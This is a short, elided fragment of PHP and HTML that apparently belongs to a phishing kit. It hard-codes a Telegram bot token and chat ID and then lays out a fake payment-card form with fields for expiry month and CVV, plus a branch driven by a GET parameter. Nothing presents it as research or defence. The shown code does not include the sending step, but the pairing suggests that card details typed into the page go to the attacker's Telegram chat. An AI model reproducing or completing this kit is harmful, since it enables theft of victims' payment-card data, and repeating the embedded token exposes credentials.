...
$token = '5797940789:AAEhVi0rKKuqVWSPBmyXiU91bLrWMxj2Sck';
$chat_id = '1933639342';
...
<label for="cardMonth" class="card-item__dateItem"><span>MM</span></label>	/		
				  ...
				  <img src="23.jpeg" class="card-item__bg"></div> 
				  <div class="card-item__band"></div> <div class="card-item__cvv">
				  <div class="card-item__cvvTitle">CVV</div> <div class="card-item__cvvBand"></div> <div class="card-item__type"><img src="visa.png" class="card-item__typeImg"></div></div>
				  </div></div></div> 
				  ...
				  <?php if($_GET['act'] == 'link'){?>
				  				 <center><label for="cardNumber" class="card-input__label"></label><br> </center>
				  <?php }?>
